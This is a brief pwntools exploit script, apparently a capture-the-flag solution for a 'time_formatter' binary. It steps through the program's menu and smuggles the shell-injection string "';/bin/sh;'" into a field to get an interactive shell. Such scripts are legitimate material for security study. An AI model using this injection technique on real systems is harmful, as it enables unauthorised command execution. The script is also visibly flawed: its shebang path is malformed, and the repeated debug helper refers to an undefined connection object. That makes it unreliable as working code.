#!usr/bin/env python
from pwn import *
 #context.log_level = 'debug'
#p = remote("220.249.52.133", 53284)
context(arch='amd64',os='linux',log_level='debug')
elf=ELF('./time_formatter')
p = process('./time_formatter')

def debug(addr1 = '0x400e33'):
    raw_input('debug')
    gdb.attach(conn, "b * " + addr1)
debug()

def debug(addr1 = '0x400c2c'):
    raw_input('debug')
    gdb.attach(conn, "b * " + addr1)
debug()

def debug(addr1 = '0x400ebd'):
    raw_input('debug')
    gdb.attach(conn, "b * " + addr1)
debug()

def debug(addr1 = '0x400faa'):
    raw_input('debug')
    gdb.attach(conn, "b * " + addr1)
debug()

def debug(addr1 = '0x400fb6'):
    raw_input('debug')
    gdb.attach(conn, "b * " + addr1)
debug()

p.sendlineafter(">", str(1))
p.sendline("%a")

p.sendlineafter(">", str(5))
p.sendline("")

p.sendlineafter(">", str(2))
p.sendline("111")

p.sendlineafter(">", str(3))
p.sendline("';/bin/sh;'")

p.sendlineafter(">", str(4))

p.interactive()
